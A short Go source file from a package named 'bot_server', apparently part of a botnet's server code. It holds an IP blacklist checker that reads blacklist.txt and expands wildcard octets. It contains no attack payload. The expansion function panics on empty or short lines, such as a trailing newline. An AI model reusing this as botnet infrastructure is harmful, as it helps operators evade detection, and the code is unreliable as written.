package bot_server

import (
	"contagio/contagio/config/logging"
	"fmt"
	"os"
	"strings"
)

func IsBlacklisted(ip string) bool {
	ips := parseBlacklist()
	for _, i := range ips {
		if ip == i {
			return true
		}

	}
	return false
}

func parseBlacklist() (result []string) {

	_blacklist, err := os.ReadFile("./blacklist.txt")
	if err != nil {
		logging.PrintWarning("Can't read blacklist file")
	}

	for _, i := range strings.Split(string(_blacklist), "\n") {
		if strings.HasPrefix(i, "#") {
			continue
		}

		result = append(result, expandIps(i)...)
	}
	return

}

func expandIps(t string) []string {
	parts := strings.Split(t, ".")
	var ips []string

	var generate func(int, []string)
	generate = func(partIndex int, currentIP []string) {
		if partIndex == 4 {
			ips = append(ips, strings.Join(currentIP, "."))
			return
		}

		part := parts[partIndex]
		if part == "*" {
			for i := 0; i <= 255; i++ {
				currentIP[partIndex] = fmt.Sprintf("%d", i)
				generate(partIndex+1, currentIP)
			}
		} else {
			currentIP[partIndex] = part
			generate(partIndex+1, currentIP)
		}
	}

	generate(0, make([]string, 4))
	return ips

}
